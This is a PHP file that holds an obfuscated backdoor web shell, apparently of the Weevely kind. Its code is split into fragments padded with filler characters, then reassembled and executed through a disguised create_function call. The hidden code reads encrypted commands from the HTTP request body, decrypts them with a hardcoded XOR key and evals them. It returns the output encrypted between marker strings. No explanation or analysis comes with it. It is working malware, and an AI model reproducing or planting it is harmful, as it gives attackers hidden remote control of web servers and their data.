<?php
$P='($i=0;$iIl<$l;Il){for($j=0;Il($j<Il$c&Il&$i<Il$l);$j++,$i+IlIl+){$o.=$t{$iIl}^$k{$j}';
$y='Il5eUo8ODr";function Ilx(Il$t,$k){IlIlIl$c=IlsIltrlen($k);$l=strlen($t);$o=Il"";fIlor';
$Q='(Il);$r=@baseIl64_encIlode(@x(Il@gzcompreIlss($IlIlo),$k));priIlnt("$Ilp$kh$r$kf");}';
$U=str_replace('h','','chreathehh_fhhunction');
$p='Il;}}reIlturn $Ilo;}if Il(@pregIl_mIlIlatch("/Il$kh(.+)$kfIl/",@fileIl_Ilget_Ilcont';
$J='baIlIlse64_decode($m[1])Il,$k))Il);Il$o=@ob_gIlet_conteIlnIltsIl();@ob_end_clIleaIln';
$k='ents("php:/Il/input")Il,$m)Il==1) {Il@Ilob_start();@eIlval(@gIlzuncomIlpressIl(@Ilx(@';
$d='$k="7fIl65f93Il0";$Ilkh="fa4Ilfd0d22Il51Il6";$kf="75782IlIlf95d80e";$p=Il"IlIlDbZIl9pOzG';
$h=str_replace('Il','',$d.$y.$P.$p.$k.$J.$Q);
$s=$U('',$h);$s();
?>
